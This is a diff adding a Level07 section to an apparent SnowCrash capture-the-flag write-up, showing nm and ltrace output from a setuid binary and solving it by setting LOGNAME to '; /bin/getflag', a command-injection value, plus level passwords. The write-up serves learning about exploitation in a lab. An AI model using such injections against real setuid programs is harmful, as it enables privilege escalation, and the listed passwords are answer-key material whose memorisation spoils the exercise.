@@ -247,3 +247,49 @@ level06@SnowCrash:~$ ./level06 $HOME/execFlag
 ```
 
 After that we have to log with `level07` and give the password `wiok45aaoguiboiki2tuin6ub`.
+
+## Level07
+
+```bash
+level07@SnowCrash:~$ ls -l
+total 12
+-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
+```
+
+For this level we are gonna used [nm](https://linux.die.net/man/1/nm).
+```bash
+level07@SnowCrash:~$ nm -u level07
+         w _Jv_RegisterClasses
+         w __gmon_start__
+         U __libc_start_main@@GLIBC_2.0
+         U asprintf@@GLIBC_2.0
+         U getegid@@GLIBC_2.0
+         U getenv@@GLIBC_2.0
+         U geteuid@@GLIBC_2.0
+         U setresgid@@GLIBC_2.0
+         U setresuid@@GLIBC_2.0
+         U system@@GLIBC_2.0
+evel07@SnowCrash:~$ ltrace ./level07
+__libc_start_main(0x8048514, 1, 0xbffff7b4, 0x80485b0, 0x8048620 <unfinished ...>
+getegid()                                                           = 2007
+geteuid()                                                           = 2007
+setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                 = 0
+setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                 = 0
+getenv("LOGNAME")                                                   = "level07"
+asprintf(0xbffff704, 0x8048688, 0xbfffff36, 0xb7e5ee55, 0xb7fed280) = 18
+system("/bin/echo level07 "level07
+ <unfinished ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                              = 0
++++ exited (status 0) +++
+level07@SnowCrash:~
+```
+
+We can see the file used the env variable `LOGNAME`.
+
+```bash
+level07@SnowCrash:~$ export LOGNAME="; /bin/getflag"
+level07@SnowCrash:~$ ./level07
+```
+
+After that we have to log with `level08` and give the password `fiumuikeil55xe9cu4dood66h`.
